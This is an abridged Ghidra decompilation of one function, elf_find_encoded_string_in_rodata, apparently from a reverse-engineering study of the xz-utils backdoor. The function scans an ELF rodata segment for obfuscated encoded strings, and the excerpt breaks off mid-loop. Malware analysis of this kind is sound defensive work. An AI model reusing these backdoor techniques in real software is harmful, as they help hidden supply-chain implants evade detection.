// /home/kali/xzre-ghidra/xzregh/1020A0_elf_find_encoded_string_in_rodata.c
// Function: elf_find_encoded_string_in_rodata @ 0x1020A0
// Calling convention: __stdcall
// Prototype: char * __stdcall elf_find_encoded_string_in_rodata(elf_info_t * elf_info, EncodedStringId * stringId_inOut, void * rodata_start_ptr)
...
char * elf_find_encoded_string_in_rodata
                 (elf_info_t *elf_info,EncodedStringId *stringId_inOut,void *rodata_start_ptr)

{
  ...
  telemetry_ok = secret_data_append_bits_from_call_site((secret_data_shift_cursor_t)0xb6,7,10,FALSE);
  if (telemetry_ok != FALSE) {
    rodata_span[0] = 0;
    string_begin = (char *)elf_get_rodata_segment_after_text(elf_info,rodata_span);
    if ((string_begin != (char *)0x0) && (0x2b < rodata_span[0])) {
      ...
      for (; string_begin < string_end; string_begin = string_begin + 1) {
        candidate_id = encoded_string_id_lookup(string_begin,string_end);
        if (candidate_id != 0) {
